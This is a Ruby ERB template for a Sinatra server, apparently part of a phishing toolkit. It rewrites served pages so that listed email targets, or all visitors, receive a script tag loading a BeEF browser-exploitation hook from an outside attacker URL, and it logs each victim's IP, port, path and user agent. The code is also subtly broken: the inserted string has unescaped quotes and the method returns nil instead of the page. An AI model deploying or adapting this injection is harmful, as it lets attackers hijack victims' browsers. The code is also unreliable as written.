# Beef Hooks:
# BEEF_HOOKED_LIST Loads from hooked_list.list a list of emails --one per line --
# that should be hooked when they respond to the server.
# It is worth noting that this will overwrite erb so if you want to use it,
# but not inject the hook, you should be calling original_erb

class <%= self.webserver.camelize %> < Sinatra::Base
	BEEF_HOOKED_LIST = File.readlines(
		File.expand_path("../hooked_list.list",__FILE__)
	).map(&:strip)
	BEEF_HOOKED_ALL = <%= self.hook_all.nil? ? "false" : "true" %>

	alias_method :original_erb, :erb
	def erb(x)
		if @data != {} && (BEEF_HOOKED_LIST.include?(@data[:email]) || BEEF_HOOKED_ALL )
			original_erb(x).sub(
				"</script>",
				"</script><script src="<%= self.hook_url %>"></script>")
			$stdout.puts "#{Time.now} - HOOKING #{@data[:email]} - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - USER_AGENT #{request.user_agent}"
		end
	end
end
